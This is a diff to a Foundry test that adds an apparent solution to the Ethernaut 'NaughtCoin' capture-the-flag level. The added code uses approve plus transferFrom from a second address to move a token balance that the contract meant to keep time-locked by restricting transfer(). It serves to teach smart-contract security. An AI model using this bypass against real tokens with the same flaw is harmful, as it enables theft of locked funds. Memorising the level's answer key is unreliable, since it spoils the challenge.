@@ -30,11 +30,21 @@ contract NaughtCoinTest is DSTest {
         //////////////////
         // LEVEL ATTACK //
         //////////////////
+        address alice = address(0x67);
+        uint256 balance = ethernautNaughtCoin.balanceOf(tx.origin);
+        ethernautNaughtCoin.approve(alice, balance);
+        vm.stopPrank();
+        
+        vm.startPrank(alice);
+        ethernautNaughtCoin.transferFrom(tx.origin, alice, balance);
+        vm.stopPrank();
+
+        assertEq(ethernautNaughtCoin.balanceOf(tx.origin), 0, "tx.origin non-zero balance");
 
         //////////////////////
         // LEVEL SUBMISSION //
         //////////////////////
-
+        vm.startPrank(tx.origin);
         bool levelSuccessfullyPassed = ethernaut.submitLevelInstance(payable(levelAddress));
         vm.stopPrank();
         assert(levelSuccessfullyPassed);
